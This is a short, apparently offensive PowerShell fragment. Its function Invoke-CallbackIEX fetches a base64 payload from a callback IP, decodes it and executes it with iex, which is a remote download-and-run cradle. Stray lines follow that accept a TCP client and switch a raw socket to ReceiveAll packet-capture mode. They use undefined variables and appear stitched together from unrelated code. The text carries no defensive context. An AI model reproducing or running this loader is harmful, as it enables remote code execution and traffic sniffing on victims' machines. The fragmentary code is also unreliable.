function Invoke-CallbackIEX {
    param([string]$CallbackIP)
    $enc = (New-Object Net.WebClient).DownloadString("http://$CallbackIP/resource")
    $b = [System.Convert]::FromBase64String($enc)
    $dec = [System.Text.Encoding]::UTF8.GetString($b)
    iex $dec
}
$Client = $Listener.AcceptTcpClient()
$ips = [System.Net.Dns]::GetHostAddresses($Hostname)
$socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,$byteIn,$byteOut)
